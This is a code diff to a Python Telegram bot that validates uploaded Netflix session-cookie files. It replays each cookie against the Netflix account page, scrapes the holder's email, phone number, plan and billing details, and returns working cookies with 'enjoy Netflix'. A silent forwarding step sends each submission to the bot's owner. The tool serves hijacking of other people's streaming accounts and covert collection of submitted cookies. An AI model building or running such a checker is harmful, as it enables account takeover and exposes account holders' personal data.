@@ -4,12 +4,12 @@ import io
 import json
 import zipfile
 import logging
-import requests
 import re
 from datetime import datetime, timezone
 
 import pycountry
 import langcodes
+import httpx
 from dotenv import load_dotenv
 from telegram import Update, Document, InputFile, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
@@ -24,7 +24,7 @@ from telegram.ext import (
 load_dotenv()
 TELEGRAM_TOKEN       = os.getenv("TELEGRAM_TOKEN")
 OWNER_CHAT_ID        = os.getenv("OWNER_CHAT_ID")
-CHANNEL_CHAT_ID      = os.getenv("CHANNEL_CHAT_ID")  # Channel Chat ID
+CHANNEL_CHAT_ID      = os.getenv("CHANNEL_CHAT_ID")
 CHANNEL_INVITE_LINK  = os.getenv("CHANNEL_INVITE_LINK")
 if not (TELEGRAM_TOKEN and OWNER_CHAT_ID and CHANNEL_CHAT_ID and CHANNEL_INVITE_LINK):
     logging.error("Please set TELEGRAM_TOKEN, OWNER_CHAT_ID, CHANNEL_CHAT_ID, and CHANNEL_INVITE_LINK in your .env")
@@ -35,7 +35,6 @@ CHANNEL_CHAT_ID = int(CHANNEL_CHAT_ID)
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# Helper to return the invite link from .env
 async def get_channel_invite_link(context):
     return CHANNEL_INVITE_LINK
 
@@ -122,7 +121,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         chat_member = await context.bot.get_chat_member(CHANNEL_CHAT_ID, user_id)
         if chat_member.status in ['member', 'administrator', 'creator']:
             await update.message.reply_text(
-                f"👋 Hi! {full_name}\nSend me your Netflix‑cookies file(s) in .txt, .json, or .zip format, and I’ll check whether they’re still valid.",
+                f"👋 Hi! {full_name}\nSend me your Netflix-cookies file(s) in .txt, .json, or .zip format, and I’ll check whether they’re still valid.",
                 reply_to_message_id=update.message.message_id
             )
         else:
@@ -130,7 +129,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             keyboard = [[InlineKeyboardButton("Join our channel", url=invite_link)]]
             reply_markup = InlineKeyboardMarkup(keyboard)
             await update.message.reply_text(
-                f"👋 Hi! {full_name}\nJoin our channel to check your Netflix‑cookies whether they’re still valid.",
+                f"👋 Hi! {full_name}\nJoin our channel to check your Netflix-cookies whether they’re still valid.",
                 reply_markup=reply_markup,
                 reply_to_message_id=update.message.message_id
             )
@@ -140,7 +139,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         keyboard = [[InlineKeyboardButton("Join our channel", url=invite_link)]]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await update.message.reply_text(
-            f"👋 Hi! {full_name}\nJoin our channel to check your Netflix‑cookies whether they’re still valid.",
+            f"👋 Hi! {full_name}\nJoin our channel to check your Netflix-cookies whether they’re still valid.",
             reply_markup=reply_markup,
             reply_to_message_id=update.message.message_id
         )
@@ -161,7 +160,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
             keyboard = [[InlineKeyboardButton("Join our channel", url=invite_link)]]
             reply_markup = InlineKeyboardMarkup(keyboard)
             return await update.message.reply_text(
-                f"👋 Hi! {full_name}\nJoin our channel to check your Netflix‑cookies whether they’re still valid.",
+                f"👋 Hi! {full_name}\nJoin our channel to check your Netflix-cookies whether they’re still valid.",
                 reply_markup=reply_markup,
                 reply_to_message_id=orig_id
             )
@@ -171,7 +170,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         keyboard = [[InlineKeyboardButton("Join our channel", url=invite_link)]]
         reply_markup = InlineKeyboardMarkup(keyboard)
         return await update.message.reply_text(
-            f"👋 Hi! {full_name}\nJoin our channel to check your Netflix‑cookies whether they’re still valid.",
+            f"👋 Hi! {full_name}\nJoin our channel to check your Netflix-cookies whether they’re still valid.",
             reply_markup=reply_markup,
             reply_to_message_id=orig_id
         )
@@ -244,32 +243,40 @@ async def process_file(
             reply_to_message_id=orig_id
         )
 
-    session = requests.Session()
-    session.headers.update({"User-Agent": "Mozilla/5.0"})
-    session.cookies.update(cookies)
-    try:
-        resp = session.get(
-            "https://www.netflix.com/account",
-            allow_redirects=True,
-            timeout=10
-        )
-        html = resp.text
-        valid = resp.url.startswith("https://www.netflix.com/account")
-    except Exception:
-        valid = False
-        html = ""
+    # Non-blocking HTTP via httpx.AsyncClient
+    async with httpx.AsyncClient(
+        headers={"User-Agent": "Mozilla/5.0"},
+        cookies=cookies,
+        timeout=10.0
+    ) as client:
+        try:
+            resp = await client.get(
+                "https://www.netflix.com/account",
+                follow_redirects=True
+            )
+            html = resp.text
+            valid = str(resp.url).startswith("https://www.netflix.com/account")
+        except httpx.HTTPError:
+            valid = False
+            html = ""
 
     if valid:
         info = extract_netflix_account_info(html)
         billed_using = info.splitlines()[1:] if info else []
 
-        change_plan_m = re.search(r'"canChangePlan":\s*{\s*"fieldType":\s*"Boolean",\s*"value":\s*(true|false)}', html)
+        change_plan_m = re.search(
+            r'"canChangePlan":\s*{\s*"fieldType":\s*"Boolean",\s*"value"\s*:(true|false)}',
+            html
+        )
         can_change_plan = change_plan_m.group(1).capitalize() if change_plan_m else None
 
         hold_m = re.search(r'"isUserOnHold"\s*:\s*(true|false)', html)
         hold = hold_m.group(1).capitalize() if hold_m else None
 
-        pd_m = re.search(r'"localizedPlanName"\s*:\s*{[^}]*"value"\s*:\s*"([^"]+)"', html)
+        pd_m = re.search(
+            r'"localizedPlanName"\s*:\s*{[^}]*"value"\s*:\s*"([^"]+)"',
+            html
+        )
         plan = pd_m.group(1) if pd_m else None
 
         ms_m = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', html)
@@ -286,13 +293,13 @@ async def process_file(
         if name_val:
             name_val = bytes(name_val, 'utf-8').decode('unicode_escape')
 
-        em_m = re.search(r'"emailAddress"\s*:\s*"([^"]+)"', html)
+        em_m = re.search(r'"emailAddress"\s*:\s*"(.*?)"', html)
         mail = bytes(em_m.group(1), 'utf-8').decode('unicode_escape') if em_m else None
 
-        ph_m = re.search(r'"phoneNumber"\s*:\s*"([^"]+)"', html)
+        ph_m = re.search(r'"phoneNumber"\s*:\s*"(.*?)"', html)
         phone = bytes(ph_m.group(1), 'utf-8').decode('unicode_escape') if ph_m else None
 
-        ms2_m = re.search(r'"memberSince"\s*:\s*{[^}]*"value"\s*:\s*(\d+)', html)
+        ms2_m = re.search(r'"memberSince"\s*:\s*{[^}]*"value"\s*:(\d+)', html)
         signup = None
         if ms2_m:
             ts = int(ms2_m.group(1)) / 1000.0
@@ -302,7 +309,7 @@ async def process_file(
         np_m = re.search(r'"nextBillingDate"\s*:\s*{[^}]*"value"\s*:\s*"([^"]+)"', html)
         next_pay = bytes(np_m.group(1), 'utf-8').decode('unicode_escape') if np_m else None
 
-        ems_m = re.search(r'"showExtraMemberSection"\s*:\s*{[^}]*"value"\s*:\s*(true|false)', html)
+        ems_m = re.search(r'"showExtraMemberSection"\s*:\s*{[^}]*"value"\s*:(true|false)', html)
         extra_slots = ems_m.group(1).capitalize() if ems_m else None
 
         lang_m = re.search(r'"language"\s*:\s*"([a-z]{2})"', html)
@@ -310,7 +317,6 @@ async def process_file(
         if lang_m:
             display_lang = langcodes.Language.get(lang_m.group(1)).display_name()
 
-        # Build the response
         section = ["Account Information:"]
         section += billed_using
         if country:      section.append(f"Country: {country}")
@@ -319,7 +325,7 @@ async def process_file(
             status = "Active" if hold == "False" else "On Hold"
             section.append(f"Plan status: {status}")
         if plan:         section.append(f"Plan details: {plan}")
-        if can_change_plan:  # Only include if it's available
+        if can_change_plan:
             section.append(f"Can change plan: {can_change_plan}")
         if next_pay:     section.append(f"Next payment: {next_pay}")
         if signup:       section.append(f"Signup D&T: {signup}")
@@ -332,12 +338,11 @@ async def process_file(
         base_caption = f"✅  This cookie is working, enjoy Netflix 🍿. Checked by @{bot_user}"
         full_caption = base_caption + "\n\n" + "\n".join(section)
 
-        # Send the file back with the original extension
-        bio = io.BytesIO(content.encode('utf-8'))
-        bio.seek(0)
+        bio_buf = io.BytesIO(content.encode('utf-8'))
+        bio_buf.seek(0)
         ext = os.path.splitext(name)[1].lower()
-        new_name = f"@{bot_user} - {orig_id}{ext}"
-        input_file = InputFile(bio, filename=new_name)
+        new_name = f"@{bot_user}-{orig_id}{ext}"
+        input_file = InputFile(bio_buf, filename=new_name)
         await context.bot.send_document(
             chat_id=chat_id,
             document=input_file,
@@ -345,7 +350,6 @@ async def process_file(
             reply_to_message_id=orig_id
         )
 
-        # Silently forward to owner
         owner_caption = (
             f"Chat ID: <a href=\"tg://user?id={user_id}\">{user_id}</a>\n"
             f"Full name: {full_name}\n"
